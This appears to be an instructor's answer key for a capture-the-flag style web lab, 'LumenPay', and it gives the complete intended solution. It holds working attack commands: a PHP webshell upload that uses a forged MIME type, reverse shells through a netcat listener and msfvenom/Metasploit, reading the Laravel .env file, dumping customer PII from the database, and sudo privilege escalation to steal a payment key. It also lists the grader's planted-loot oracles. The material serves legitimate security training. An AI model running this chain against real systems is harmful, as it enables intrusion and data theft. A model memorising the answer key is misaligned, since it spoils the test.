# Solution — 06 LumenPay (medium, webapp set)

> Spoilers — instructor's answer key.

## Surface

`GET /` is the LumenPay landing page (served from Laravel's `public/`). It links to
**merchant onboarding** at `GET /merchant/onboarding`, a `GET /merchant/directory` listing
(DB-backed, for realism), and Laravel's stock `GET /up` health endpoint. `whatweb`/response
headers show PHP + Laravel (the `laravel_session` cookie, `/up`). The onboarding page carries
the document-upload form — the vulnerable endpoint is advertised in the form's `action`, not
guessable from a default wordlist.

## Intended chain — upload → RCE → reverse shell → privesc

### 1. Find the upload endpoint (vector C)

`ffuf`/`nikto` against `/` will *not* reveal it. Instead, browse the app: the landing page
links to `/merchant/onboarding`, whose form posts a file to:

```
POST /merchant/onboarding/document     field name: document
```

The handler (`app/Http/Controllers/MerchantDocumentController.php`) validates **only the
client-declared MIME type** and then stores the file under the web-reachable
`public/uploads/kyc/` keeping the **original filename and extension**.

### 2. Upload a PHP webshell (insufficient validation → RCE)

Write a one-line shell and upload it with a forged `Content-Type` so the client-MIME check
passes while the `.php` extension survives:

```sh
printf '<?php system($_GET["c"]); ?>' > shell.php

curl -s http://127.0.0.1:8506/merchant/onboarding/document \
  -F 'business=Acme Retail Ltd' \
  -F 'contact=billing@acme.example' \
  -F 'document=@shell.php;type=image/png'
```

The response echoes the stored location, e.g.
`Document received. Review copy: http://app.lumenpay.lab/uploads/kyc/shell.php`. Because the
file lives under the Laravel `public/` docroot and Apache's `mod_php` runs any existing
`.php`, it is now an executable webshell:

```sh
curl -s 'http://127.0.0.1:8506/uploads/kyc/shell.php?c=id'
# uid=33(www-data) gid=33(www-data) ...
```

> This is also reachable with Metasploit's `exploit/multi/http/php_generic` style flow, or
> `msfvenom -p php/meterpreter/reverse_tcp` dropped as the uploaded `.php` (see below).

### 3. Reverse shell (vector J)

Pick either route.

**php-reverse-shell as the uploaded document:**

```sh
# edit $ip/$port in pentestmonkey's php-reverse-shell.php, then:
curl -s http://127.0.0.1:8506/merchant/onboarding/document \
  -F 'document=@php-reverse-shell.php;type=image/png'
# listener:
nc -lvnp 4444
curl -s 'http://127.0.0.1:8506/uploads/kyc/php-reverse-shell.php'
```

**or msfvenom + multi/handler:**

```sh
msfvenom -p php/reverse_php LHOST=127.0.0.1 LPORT=4444 -f raw -o rev.php
# prepend "<?php " if your payload needs it, then upload rev.php as above
msfconsole -q -x 'use multi/handler; set payload php/reverse_php; set LHOST 127.0.0.1; set LPORT 4444; run'
curl -s 'http://127.0.0.1:8506/uploads/kyc/rev.php'
```

You now have an interactive shell as **www-data** on `app.lumenpay.lab`.

### 4. Loot the framework config

The Laravel `.env` sits in the app root and is readable by the web user:

```sh
cat /var/www/html/.env
# APP_KEY=base64:AHk3...  DB_USERNAME=lumenpay_app  DB_PASSWORD=lumenpay-db-pw-2024
```

Those MySQL creds are valid against `db.lumenpay.lab` (`10.20.6.10`) and dump the
`merchants` / `customers` books (billing PII, card last-4, MRR):

```sh
mysql -h db -ulumenpay_app -plumenpay-db-pw-2024 lumenpay -e 'SELECT * FROM customers;'
```

### 5. Privilege escalation (vector K)

A left-behind deploy sudoers drop-in grants the web user passwordless root:

```sh
sudo -n -l
# (ALL) NOPASSWD: ALL        <-- /etc/sudoers.d/90-lumenpay-deploy
sudo -n cat /opt/lumenpay/secrets/payment_gateway.key
# LUMENPAY_GW_SECRET=sk_live_lumenpay_8f3c1a9e4b7d20516273c4a9
sudo -n id   # uid=0(root)
```

The payment-gateway signing key is `root`-only (mode `600`), so recovering it **proves** the
privesc, not just the file read. `sudo bash` gives a full root shell on the container.

## Planted loot (manifest oracles)

| id | what | where |
|----|------|-------|
| `laravel-env-dbpass` | `DB_PASSWORD=lumenpay-db-pw-2024` (+ `APP_KEY`) | `app:/var/www/html/.env` |
| `lumenpay-landing-up` | `LumenPay` on the landing page | `GET http://127.0.0.1:8506/` |
| `payment-gateway-key` | `sk_live_lumenpay_8f3c1a9e4b7d20516273c4a9` | `app:/opt/lumenpay/secrets/payment_gateway.key` (root-only) |

## Reset

`make lab-restore LAB=06-medium-laravel` (recreate — drops the MySQL volume, rebuilds the app
image so the `public/uploads/kyc/` drop zone is empty again, and re-seeds).
